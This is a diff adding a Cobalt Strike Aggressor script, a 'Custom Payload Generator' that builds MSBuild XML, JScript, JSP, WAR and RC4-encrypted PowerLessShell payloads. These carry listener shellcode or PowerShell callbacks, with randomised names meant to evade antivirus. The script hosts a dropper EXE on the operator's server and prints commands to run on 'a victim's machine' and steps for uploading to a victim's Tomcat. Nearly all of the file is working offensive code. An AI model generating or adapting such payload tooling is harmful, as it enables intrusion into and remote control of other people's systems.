@@ -1,0 +1,373 @@
+# Custom Payload Generator
+# Author: Alex Williams
+# v1.0.5 12/06/2018
+# Contact: @offsec_ginger
+# Site: https://stormctf.ninja
+# GH: https://github.com/offsecginger
+
+# Features:
+# MSBuild XML Generator:
+#
+#	Build an XML document that can be run with MSBuild.
+#	.NET 4.0 required on victim host.
+
+# JSC JScript Generator:
+#
+#	Build a JScript file that may be compiled with JSC.
+#	.NET 4.0 required on victim host.
+
+# Windows JScript Dropper
+#
+#	Build a JScript file that downloads a stageless EXE
+#	from a site hosted by Cobalt Strike. (Host setup included)
+
+# JSP Generator:
+#
+#	Build a JSP file that executes a PowerShell callback.
+
+# WAR Generator:
+#
+#	Build a WAR file that once uploaded to Tomcat, executes a PowerShell callback.
+
+# PowerLessShell based MSBuild XML Generator:
+#
+#	Build an XML document that can be run with MSBuild.
+#	.NET 4.0 required on victim host.
+# 	This is based on the PowerLessShell shellcode implementation
+#	found here: https://github.com/Mr-Un1k0d3r/PowerLessShell
+#	Higher success rate at evading A/V than original MSBuild module.
+#	NOTE: Python must be installed, because writing the RC4 alg in 
+#	Sleep is ridiculous.
+
+# Change this to set the payloads to External/Internal Hosts / IPs
+
+global('$hostip', '$jsport', '$ssl','$TEMPDIR');
+$hostip = localip();
+$jsport = "80";
+$ssl = "false";
+$TEMPDIR = cwd(). "/payloads/";
+
+######################################
+
+mkdir(cwd(). "/payloads/");
+menubar("More Payloads", "morepayloads", 2);
+popup morepayloads {
+		item "&Generate Payload..." {
+			generate_payload();
+	}
+		item "&JScript Dropper Settings..." {
+			jssettings();
+	}
+}
+
+sub jssettings {
+	$dialog = dialog("JScript Settings", %(hostip => $hostip, ssl => $ssl, port => $jsport), &jssettingsupdate);
+	dialog_description($dialog,"Select the dropper host used for custom callbacks. Set whether or not to use SSL. Specify the port to use for the sites. NOTE: JScript doesn't like bad SSL Certs!!!");
+	drow_text($dialog, "hostip", "Host or IP: ");
+	drow_text($dialog, "port", "Port: ");
+	drow_checkbox($dialog, "ssl", "SSL: ", "Use SSL?");
+	dbutton_action($dialog, "Save");
+	dialog_show($dialog);
+
+}
+
+sub jssettingsupdate {
+	if ($3['ssl'] eq "true") {
+		$ssl = "true";
+	}
+	else {
+		$ssl = "false";
+	}
+	if ($3['hostip'] ismatch "") {
+		berror($1, 'You did not select a proper Host or IP.');
+		show_message("Please select a proper Host or IP.");
+		$hostip = localip();
+	}
+	else {
+		$hostip = $3['hostip'];
+	}
+	if ($3['port'] ismatch "") {
+		berror($1, 'You did not select a proper Port.');
+		show_message("Please select a proper Port.");
+		$jsport = 80;
+	}
+	else if ($3['port'] !isin range("1-65535")) {
+		berror($1, 'You did not select a proper Port.');
+		show_message("Please select a proper Port.");
+		$jsport = 80;
+	}
+	else {
+		$jsport = $3['port'];
+	}
+}
+
+
+sub generate_payload {
+	$dialog = dialog("Custom Payload Generator", %(listener => "Listener: ", payload_type => "Payload Type: ", output => "output: "), &output);
+	dialog_description($dialog, "Generates a payload from a user created template.");
+	drow_listener($dialog, "listener", "Listener: ");
+	drow_combobox($dialog, "payload_type", "Payload Type: ", @("Staged","Stageless"));
+	drow_combobox($dialog, "output", "Output: ", @("MSBuild XML","JSC JScript","Windows JScript", "JSP","WAR","PowerLessShell"));
+	drow_checkbox($dialog, "x64", "x64: ", "Use x64 Payload")
+	dbutton_action($dialog, "Generate");
+	dialog_show($dialog);
+}
+
+sub output {
+	if ($3['listener'] ismatch "") {
+		berror($1, 'You did not select a proper Listener.');
+		show_message("Please select a proper Listener.");
+	}
+	else if ($3['output'] eq 'MSBuild XML') {
+		$arch = "x86";
+		if ($3['x64'] eq "true") {
+			$arch = "x64";
+		}
+
+		if ($3['payload_type'] eq "Staged") {
+			$payload_string = artifact($3['listener'], "powershell", $arch);
+			$handle = openf(script_resource("./templates/msbuild_template.xml"));
+			$data   = readb($handle, -1);
+			$fdata = strrep($data, "%%DATA%%", base64_encode(gzip($payload_string)), "%%TASKNAME%%", random_string(rand(range("10-15"))), "%%TARGETNAME%%", random_string(rand(range("10-15"))), "%%VARIABLE%%", random_string(rand(range("10-15"))), "%%PIPELINE%%", random_string(rand(range("10-15"))), "%%RUNSPACE%%", random_string(rand(range("10-15"))));
+			closef($handle);
+			$name = prompt_file_save("payload.xml", {
+				local('$outfile');
+				$outfile = openf("> $+ $1");
+				writeb($outfile, $fdata);
+				closef($outfile);
+				$filename = pop(split("/", $1));
+				prompt_text("Execute the below on a victim's machine.", "\%WINDIR\%\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe ". $filename, {
+				});
+			});
+		}
+		else {
+			artifact_stageless($3['listener'], "powershell", $arch, "", &ps1stageless_xml);
+		}
+	}
+	else if ($3['output'] eq 'JSC JScript') {
+		$arch = "x86";
+		if ($3['x64'] eq "true") {
+			$arch = "x64";
+		}
+
+		if ($3['payload_type'] eq "Staged" || $3['payload_type'] eq "Stageless") {
+			if ($3['payload_type'] eq "Stageless") {
+				show_message("Staged Payload Only for JSC.")
+			}
+			$payload_string = shellcode($3['listener'], false, $arch);
+			$handle = openf(script_resource("./templates/jsc_template.js"));
+			$data   = readb($handle, -1);
+			$fdata = strrep($data, "%%SHELLCODE%%", base64_encode($payload_string));
+			closef($handle);
+			$name = prompt_file_save("payload.js", {
+				local('$outfile');
+				$outfile = openf("> $+ $1");
+				writeb($outfile, $fdata);
+				closef($outfile);
+				$filename = pop(split("/", $1));
+				prompt_text("Execute the below on a victim's machine. Then run the resulting EXE. Alternatively, you can compile that elsewhere and execute it on the victim.", "\%WINDIR\%\\Microsoft.NET\\Framework\\v4.0.30319\\jsc.exe /t:winexe ". $filename, {
+				});
+			});
+		}
+	}
+	else if ($3['output'] eq 'Windows JScript') {
+		$arch = "x86";
+		if ($3['x64'] eq "true") {
+			$arch = "x64";
+		}
+		if ($3['payload_type'] eq "Staged" || $3['payload_type'] eq "Stageless") {
+			if ($3['payload_type'] eq "Stageless") {
+				show_message("Staged Payload Only for JScript.");
+			}
+			artifact_stageless($3['listener'], "exe", "$arch", "", &exe);
+			$targetfile = "/". random_string(rand(range("5-10")));
+			$handle = openf(script_resource("./templates/jscript_dropper_template.js"));
+			$data   = readb($handle, -1);
+			$exe_handle = openf("$TEMPDIR". $filename .".exe");
+			$exe_data   = readb($exe_handle, -1);
+			closef($exe_handle);
+			
+			if ($ssl  eq "True") {
+				$proto = "https";
+			}
+			else {
+				$proto = "http";
+
+			}
+			$fdata = strrep($data, "%%HOSTIP%%", $hostip, "%%PORT%%", $jsport, "%%PROTO%%", $proto, "%%TARGETFILE%%", $targetfile, "%%EXENAME%%", random_string(rand(range("5-10"))));
+			closef($handle);
+			$name = prompt_file_save("payload.js", {
+				local('$outfile');
+				$outfile = openf("> $+ $1");
+				writeb($outfile, $fdata);
+				closef($outfile);
+				site_host(localip(), $jsport, $targetfile, $exe_data, "automatic", "JScript Dropper EXE Host", $ssl);
+				show_message("Execute the js file on the victims machine.");
+			});
+		}
+	}
+	else if ($3['output'] eq 'JSP') {
+		$arch = "x86";
+		if ($3['x64'] eq "true") {
+			$arch = "x64";
+		}
+
+		if ($3['payload_type'] eq "Staged") {
+			$payload_string = artifact($3['listener'], "powershell", $arch);
+			$handle = openf(script_resource("./templates/jsp_template.jsp"));
+			$data   = readb($handle, -1);
+			$fdata = strrep($data, "%%DATA%%", base64_encode(gzip($payload_string)));
+			closef($handle);
+			$name = prompt_file_save("payload.jsp", {
+				local('$outfile');
+				$outfile = openf("> $+ $1");
+				writeb($outfile, $fdata);
+				closef($outfile);
+				$filename = pop(split("/", $1));
+				show_message("Execute the jsp file on the victims machine.");
+			});
+		}
+		else {
+			artifact_stageless($3['listener'], "powershell", $arch, "", &ps1stageless_jsp);
+		}
+	}
+	else if ($3['output'] eq 'WAR') {
+		$arch = "x86";
+		if ($3['x64'] eq "true") {
+			$arch = "x64";
+		}
+
+		if ($3['payload_type'] eq "Staged") {
+			$payload_string = artifact($3['listener'], "powershell", $arch);
+			$handle = openf(script_resource("./templates/jsp_template.jsp"));
+			$data   = readb($handle, -1);
+			$fdata = strrep($data, "%%DATA%%", base64_encode(gzip($payload_string)));
+			$name = prompt_file_save("payload.war", {
+				local('$outfile');
+				$jsp_file = "$TEMPDIR". random_string(rand(range("5-10"))) .".jsp";
+				$outfile = openf("> $+ $jsp_file");
+				writeb($outfile, $fdata);
+				closef($outfile);
+				exec("zip -j -m $1 $jsp_file");
+				$filename = pop(split("/", $1));
+				$pathname = substr($filename, 0, -4);
+				$jsp_name = pop(split("/", $jsp_file));
+				show_message("Upload $filename on the victims Tomcat instance. Navigate to <victim>\/".@pathname[0]."\/$jsp_name to execute.");
+			});
+		}
+		else {
+			artifact_stageless($3['listener'], "powershell", $arch, "", &ps1stageless_war);
+		}
+	}
+	else if ($3['output'] eq 'PowerLessShell') {
+		$arch = "x86";
+		if ($3['x64'] eq "true") {
+			$arch = "x64";
+		}
+		if ($3['payload_type'] eq "Staged" || $3['payload_type'] eq "Stageless") {
+			if ($3['payload_type'] eq "Staged") {
+				show_message("Stageless Payload Only for PowerLessShell.");
+			}
+			$payload_string = base64_encode(shellcode($3['listener'], false, $arch));
+			$handle = openf(script_resource("./templates/powerlessshell_template.xml"));
+			$data   = readb($handle, -1);
+			$rc4key = random_string("32");
+			$key_formatted = format_rc4($rc4key);
+			$rc4_python = script_resource("./assets/rc4.py");
+			$runrc4 = exec("python ".$rc4_python ." $rc4key \"$payload_string\"");
+			@result = readAll($runrc4);
+			$encrypted_payload = @result[0];
+			closef($runrc4);
+			$fdata = $data;
+			for ($r = 0; $r < 50; $r++) {
+				$rstring = random_string(rand(range("5-10")));
+				$data = strrep($data, "%%VAR".$r."%%", $rstring);
+			}
+			$fdata = strrep($data, "%%PAYLOAD%%", $encrypted_payload, "%%KEY%%", $key_formatted);
+			closef($handle);
+			$name = prompt_file_save("payload.xml", {
+				local('$outfile');
+				$outfile = openf("> $+ $1");
+				writeb($outfile, $fdata);
+				closef($outfile);
+				$filename = pop(split("/", $1));
+				prompt_text("Execute the below on a victim's machine.", "\%WINDIR\%\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe ". $filename, {
+				});
+			});
+		}
+	}
+}
+
+sub ps1stageless_xml {
+	$handle = openf(script_resource("./templates/msbuild_template.xml"));
+	$data   = readb($handle, -1);
+	$fdata = strrep($data, "%%DATA%%", base64_encode(gzip($1)), "%%TASKNAME%%", random_string(rand(range("10-15"))), "%%TARGETNAME%%", random_string(rand(range("10-15"))), "%%VARIABLE%%", random_string(rand(range("10-15"))), "%%PIPELINE%%", random_string(rand(range("10-15"))), "%%RUNSPACE%%", random_string(rand(range("10-15"))));
+	closef($handle);
+	$name = prompt_file_save("payload.xml", {
+		local('$outfile');
+		$outfile = openf("> $+ $1");
+		writeb($outfile, $fdata);
+		closef($outfile);
+		$filename = pop(split("/", $1));
+		prompt_text("Execute the below on a victim's machine.", "\%WINDIR\%\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe ". $filename, {
+		});
+	});
+}
+
+sub ps1stageless_jsp {
+	$handle = openf(script_resource("./templates/jsp_template.jsp"));
+	$data   = readb($handle, -1);
+	$fdata = strrep($data, "%%DATA%%", base64_encode(gzip($1)));
+	$name = prompt_file_save("payload.jsp", {
+		local('$outfile');
+		$outfile = openf("> $+ $1");
+		writeb($outfile, $fdata);
+		closef($outfile);
+		$filename = pop(split("/", $1));
+		show_message("Execute the jsp file on the victims machine.");
+	});
+}
+
+sub ps1stageless_war {
+	$handle = openf(script_resource("./templates/jsp_template.jsp"));
+	$data   = readb($handle, -1);
+	$fdata = strrep($data, "%%DATA%%", base64_encode(gzip($1)));
+	$name = prompt_file_save("payload.war", {
+		local('$outfile');
+		$jsp_file = "$TEMPDIR". random_string(rand(range("5-10"))) .".jsp";
+		$outfile = openf("> $+ $jsp_file");
+		writeb($outfile, $fdata);
+		closef($outfile);
+		exec("zip -j -m $1 $jsp_file");
+		$filename = pop(split("/", $1));
+		$pathname = substr($filename, 0, -4);
+		$jsp_name = pop(split("/", $jsp_file));
+		show_message("Upload $filename on the victims Tomcat instance. Navigate to <victim>\/$pathname\/$jsp_name to execute.");
+	});
+}
+
+
+sub random_string {
+	$limit = $1;
+	@random_str = @();
+	$characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+	for ($x = 0; $x < $limit; $x++) {
+		$n = rand(strlen($characters));
+		add(@random_str, charAt($characters, $n));
+	}
+	return join('', @random_str);
+}
+
+sub exe {
+	local('$handle');
+	$filename = random_string(rand(range("5-10")));
+	$handle = openf(">$TEMPDIR". $filename .".exe");
+	writeb($handle, $1);
+	closef($handle);
+}
+
+sub format_rc4 {
+	$key = $1;
+	@fmt = str_chunk(transform($key, "hex"), 2);
+	return "0x". join(", 0x", @fmt);
+}
